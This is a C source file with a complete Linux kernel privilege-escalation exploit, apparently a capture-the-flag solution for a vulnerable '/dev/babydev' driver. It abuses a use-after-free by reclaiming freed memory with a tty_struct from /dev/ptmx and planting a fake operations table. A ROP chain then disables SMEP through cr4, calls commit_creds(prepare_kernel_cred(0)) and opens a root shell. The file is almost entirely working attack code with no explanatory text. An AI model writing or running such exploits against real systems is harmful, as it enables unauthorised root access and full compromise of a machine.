#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

unsigned long user_cs,user_ss,user_rsp,user_flag;
unsigned long prepare_kernel_cred = 0xffffffff810a1810;
unsigned long commit_creds = 0xffffffff810a1420;

void save_state(){
    __asm__(
            "mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_rsp,rsp;"
            "pushf;"
            "pop user_flag;"
           );
    puts("[*] save the state success!");
}

void getshell(){
    system("/bin/sh");
}

void getroot(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}

int main(){

    save_state();
    
    unsigned long rop[] = {
        getroot,
        0xffffffff81063694,  // swapgs ; pop rbp ; ret
        0,
        0xffffffff814e35ef,  // iretq; ret;
        getshell,
        user_cs,
        user_flag,
        user_rsp,
        user_ss
    };

    unsigned long fake_tty_opera[30] = {
        0xffffffff810d238d,  // pop rdi ; ret
        0x6f0,
        0xffffffff81004d80,  // mov cr4, rdi ; pop rbp ; ret
        0,
        0xffffffff8100ce6e,  // pop rax ; ret
        rop,
        0xFFFFFFFF8181BFC5,
        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret
        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret
        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret
        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret
        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret
        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret
        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret
        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret
    };

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x2e0);

    //printf("rop:%x",rop);
    close(fd1);

    int fd3 = open("/dev/ptmx",O_RDWR|O_NOCTTY);

    unsigned long fake_tty_str[3] = {0};
    read(fd2,fake_tty_str,32);
    fake_tty_str[3] = fake_tty_opera;
    //printf("fake_tty_opera:%x",fake_tty_opera);
    write(fd2,fake_tty_str,32);

    write(fd3,"V1NKe",5);

    return 0;
}
